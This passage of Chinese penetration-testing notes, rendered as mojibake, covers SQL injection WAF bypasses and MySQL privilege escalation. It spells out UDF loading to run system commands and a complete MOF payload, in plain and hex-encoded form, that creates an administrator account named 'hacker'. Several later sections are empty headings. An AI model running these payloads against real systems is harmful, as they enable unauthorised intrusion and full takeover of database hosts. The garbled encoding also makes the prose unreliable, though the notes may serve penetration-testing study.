- - åˆ©ç”¨`select`æ„å»ºä¸€å¼ è™šæ‹Ÿè¡¨é€šè¿‡`union select`æŸ¥è¯¢æˆ‘ä»¬éœ€è¦çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿè¿‡`1,2,3`ä½œä¸ºå­—æ®µåæ¥æŸ¥è¯¢éœ€è¦çš„å†…å®¹ã€‚
  - 
  - `join`**æŠ¥é”™**
  - 
- **åˆ©ç”¨æ¯”è¾ƒçš„æ–¹æ³•** 
- - `select ((select 1,binary'c')>(select 1,'bzzzzz'));`

#### 2.6 ä¸­é—´ä»¶ç‰¹æ€§

-  `asp+iis` 

- -  å½“è¯·æ±‚çš„URLä¸­å­˜åœ¨å•ä¸€çš„%æ—¶ï¼Œä¼šå°†å®ƒå¿½ç•¥ã€‚(ä¿®å¤:åˆ¤æ–­%xèƒ½å¤Ÿç»„æˆå­—ç¬¦) 
  -  IISæ”¯æŒunicodeçš„è§£æï¼Œè¯·æ±‚çš„urlä¸­å­˜åœ¨unicodeå­—ç¬¦æ—¶ï¼Œiisä¼šè‡ªåŠ¨è½¬æ¢ã€‚ 

```plain
select:  s%u0065lect ->s%u00f0lect
å­—æ¯aï¼š   %u0000->%u0041->%u0061->%u00aa->%u00e2
å•å¼•å·ï¼š  %u0027->%u02b9->%u02bc->%u02c8->%u2032->%uff07->%c0%27->%c0%a7->%e0%80%a7
ç©ºç™½ï¼š    %u0020->%uff00->%c0%20->%c0%a0->%e0%80%a0
å·¦æ‹¬å·(ï¼š %u0028->%uff08->%c0%28->%c0%a8->%e0%80%a8
å³æ‹¬å·)ï¼š %u0029 ->%uff09->%c0%29->%c0%a9->%e0%80%a9
```

 

-  `asp/asp.net` 

- - åœ¨GETè¯·æ±‚ä¸‹å¯¹äº`application/x-www-form-urlencoded`æäº¤æ–¹å¼æ²¡æœ‰è¿‡æ»¤çš„è¯ï¼Œå°±ä¼šå¯¼è‡´ä»»æ„æ³¨å…¥ã€‚

-  `php/Apache` 
-  HPP(HTTPå‚æ•°æ±¡æŸ“) 

- -  å½“ç»™åŒä¸€ä¸ªå‚æ•°æä¾›å¤šä¸ªèµ‹å€¼çš„æ—¶å€™ä¸åŒçš„ä¸­é—´ä»¶è§£æä¸åŒã€‚ 

- - -  `?id=1&id=2&id=3` 

```php
Asp.net + iisï¼šid=1,2,3 
Asp + iisï¼šid=1,2,3 
Php + apacheï¼šid=3
```

 

- -  GET+POST 

```plain
GET:http://192.168.125.140/test/sql.aspx?id=1 union/*
post: id=2*/select null,null,null
```

 

-  åƒåœ¾æ•°æ® 



### 3.ææƒ



#### 3.1 udf

è‡ªå®šä¹‰å‡½æ•°æ˜¯æ•°æ®åº“åŠŸèƒ½çš„ä¸€ç§æ‹“å±•ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è‡ªå®šä¹‰å‡½æ•°å®ç°ä¸€äº›ç‰¹æ®Šçš„åŠŸèƒ½ä¸”è‡ªå®šä¹‰å‡½æ•°ä¹Ÿå¯ä»¥åœ¨SQLè¯­å¥ä¸­ä½¿ç”¨ã€‚



è¯¥æ¼æ´éœ€è¦å¯¼å…¥æˆ–å†™å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶åˆ°MySQLæ’ä»¶ç›®å½•ä¸‹ï¼Œåˆ©ç”¨åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°çš„æ–¹å¼åŠ è½½è¯¥åŠ¨æ€é“¾æ¥åº“ï¼Œç„¶ååˆ©ç”¨è¯¥è‡ªå®šä¹‰å‡½æ•°æ‰§è¡Œå‘½ä»¤ã€‚

#### 3.2 åˆ©ç”¨æ–¹å¼

æ ¹æ® 2.1æåˆ°çš„ æˆ‘ä»¬éœ€è¦å¯¼å…¥dllæˆ–soæ–‡ä»¶æ¥åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ï¼Œé‚£ä¹ˆåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶åœ¨å“ªå‘¢ï¼Ÿ

ä¸€èˆ¬æ¥è¯´æœ‰ä¸¤ç§é€”å¾„è·å–ï¼š

1. **msf**



1. **sqlmap**

åœ¨sqlmapç›®å½•ä¸‹çš„`/data/udf/mysql`ï¼Œsqlmapè‡ªå¸¦çš„åŠ¨æ€é“¾æ¥åº“ä¸ºäº†é˜²æ­¢è¢«è¯¯æ€éƒ½ç»è¿‡ç¼–ç å¤„ç†ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨ã€‚ 

é€šè¿‡sqlmapç›®å½•ä¸‹çš„`/extra/cloak/cloak.py`å¯ä»¥å¯¹è¿™é‡ŒåŠ å¯†çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶è¿›è¡Œå¤„ç†

```bash
python3 cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o /home/me7eorite/lib_mysqludf_sys_64.dll
#è·¯å¾„ä¸å”¯ä¸€ï¼Œéœ€è¦å‚è€ƒè‡ªå·±æœºå­ä¸Šçš„sqlmapä½ç½®ã€‚
```

åˆ©ç”¨å·²ç»è§£ç å¥½çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼š[ğŸ“udf.zip](https://www.yuque.com/attachments/yuque/0/2022/zip/26696908/1650885062929-2bf5c7b5-7827-453d-8cee-bb60fddd10b7.zip)

##### è·å–æ’ä»¶ç›®å½•

é¦–å…ˆæˆ‘ä»¬éœ€è¦æŠŠåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æ”¾ç½®å†æ’ä»¶ç›®å½•ä¸‹ï¼Œè¯¥ç›®å½•å¯ä»¥é€šè¿‡ä¸€ä¸‹å‘½ä»¤è·å–`show variables like "%plugin%";`

![img](assets/1647426729444-1cf67d8f-b30c-4221-8260-d9d60f1a0144.png)

åœ¨windowsç¯å¢ƒä¸‹ä¸å­˜åœ¨è¯¥ç›®å½•ï¼Œå¯ä»¥åˆ©ç”¨NTFS ADSæµåˆ›å»ºæ–‡ä»¶å¤¹ï¼ˆæˆåŠŸç‡ä¸å¤§ï¼‰

```
select 233 into dumpfile 'D:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation';
```



##### å†™å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶

**æ³¨æ„ï¼š**

- **ä½¿ç”¨** `**dumpfile**` **è€Œä¸æ˜¯** `**outfile**`

- - `**outfile**` ä¼šå¯¹å†™å…¥çš„å†…å®¹è¿›è¡Œè½¬ä¹‰ï¼Œ`dumpfile`åˆ™æ˜¯åŸæ ·å†™å…¥ã€‚



å¦‚æœä¸å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ä¹‹ç±»çš„æ¼æ´ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡æ‰§è¡ŒSQLå‘½ä»¤æ¥å†™å…¥æ–‡ä»¶

- **åˆ©ç”¨16è¿›åˆ¶å†™å…¥**

```
SELECT 0x7f454c4602... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
```

- **åŠ è½½ä¸Šä¼ åˆ°å…¶ä»–ä½ç½®çš„.soæ–‡ä»¶å¹¶å†™å…¥**

```
SELECT hex(load_file('/tmp/lib_mysqludf_sys_64.so')) into dumpfile '/usr/lib/mysql/plugin/udf.so'; 
```

[åŠ¨æ€é“¾æ¥åº“_16è¿›åˆ¶ç¼–ç ](https://www.sqlsec.com/tools/udf.html)

##### åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°

- linuxçš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶åç¼€ä¸º.soï¼Œwindowsä¸º.dll

```
CREATE FUNCTIONO sys_eval RETURNS STRING SONAME "xxxx.so";
```

- åˆ©ç”¨è‡ªå®šä¹‰çš„`sys_eval`æ‰§è¡Œå‘½ä»¤å³å¯ã€‚

![img](assets/1647427046611-172930c0-91f8-4476-9b39-d9ee9dc6f177.png)

##### åˆ é™¤è‡ªå®šä¹‰å‡½æ•°

```
drop function sys_eval;
```

##### åˆ©ç”¨åœ¨çº¿ç½‘é¡µ

[https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php](https://github.com/echohun/tools/blob/master/å¤§é©¬/udf.php)

å¤ç°å¤±è´¥==

####  4.MOF

##### 4.1 åŸç†

MOFæ–‡ä»¶æ˜¯MySQLæ•°æ®åº“çš„æ‹“å±•æ–‡ä»¶(`c:/windows/system32/wbem/mof/nullevt.mof`)ç§°ä¸ºâ€œæ‰˜ç®¡å¯¹è±¡æ ¼å¼â€ã€‚å®ƒçš„ä½œç”¨æ˜¯æ¯éš”äº”ç§’å°±ä¼šç›‘æ§è¿›ç¨‹åˆ›å»ºå’Œæ­»äº¡ã€‚



æ‰€ä»¥ï¼Œ**åˆ©ç”¨MOFæ–‡ä»¶æ¯äº”ç§’é’Ÿä»¥ç³»ç»Ÿæƒé™æ‰§è¡Œä¸€æ¬¡**ï¼Œé‚£ä¹ˆæˆ‘ä»¬é€šè¿‡mysqlæ–‡ä»¶å†™å…¥ä¸€ä¸ªMOFæ–‡ä»¶æ›¿æ¢æ‰åŸæ¥çš„MOFæ–‡ä»¶ï¼Œç³»ç»Ÿæ¯éš”5ç§’é’Ÿå°±ä¼šæ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„MOF.åˆ©ç”¨MOFæ–‡ä»¶ä¸­çš„ä¸€æ®µvpsè„šæœ¬ï¼Œæ§åˆ¶è¿™ä¸€æ®µè„šæœ¬çš„å†…å®¹ä½¿å¾—ç³»ç»Ÿæ‰§è¡Œå‘½ä»¤ï¼Œå®ç°ææƒçš„ç›®çš„ã€‚

##### 4.2 åˆ©ç”¨æ–¹å¼

**é™åˆ¶æ¡ä»¶ï¼š**

windows<=2003

mysqlåœ¨c:windows/system32/mofç›®å½•æœ‰å†™æƒé™

```bash
#pragma namespace("\\\\.\\root\\subscription") 

instance of __EventFilter as $EventFilter 
{ 
    EventNamespace = "Root\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
}; 

instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user hacker P@ssw0rd /add\")\nWSH.run(\"net.exe localgroup administrators hacker /add\")"; 
	#æ ¸å¿ƒé…ç½®ä»£ç 
}; 

instance of __FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
};
```

é€šè¿‡16è¿›åˆ¶ç¼–ç åå°†mofä¿å­˜åˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ã€‚

```sql
select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile "C:/windows/system32/wbem/mof/test.mof";
```

æ¥ä¸‹æ¥å°±æ˜¯ç­‰å®ƒè‡ªåŠ¨æ‰§è¡Œã€‚

### 4.SQLæ³¨å…¥ä¿®å¤

#### 4.1 é¢„ç¼–è¯‘

#### 4.2 PDO

#### 4.3 æ­£åˆ™

#### 4.4 å…¶ä»–

1. é˜²ç«å¢™
2. 

## 0x02 SQL Server

### 1.å¸¸è§ç±»å‹



### 2.bypass



### 3.ææƒ



## 0x03 Oracle



### 1.å¸¸è§ç±»å‹



### 2.bypass



### 3.ææƒ

## 0x05 POSTGRE



## 0x06 SQLMap

### 1.ä½¿ç”¨ç®€ä»‹

### 2.temperç¼–å†™

### 3.sqlmapä¸­è½¬



# å‚è€ƒæ–‡ç« 



[ä¸€æ–‡æå®šMySQL](https://gem-love.com/2022/01/26/ä¸€æ–‡æå®šMySQLç›²æ³¨/#trim)

[SQLæ³¨å…¥åŸºç¡€æ•´ç†åŠTricksæ€»ç»“](https://www.anquanke.com/post/id/205376#h3-18)

[MySQL æ¼æ´åˆ©ç”¨ä¸ææƒ](https://www.sqlsec.com/2020/11/mysql.html#toc-heading-1)

[MySQLæ³¨å…¥æŠ€å·§](https://wooyun.js.org/drops/MySQLæ³¨å…¥æŠ€å·§.html)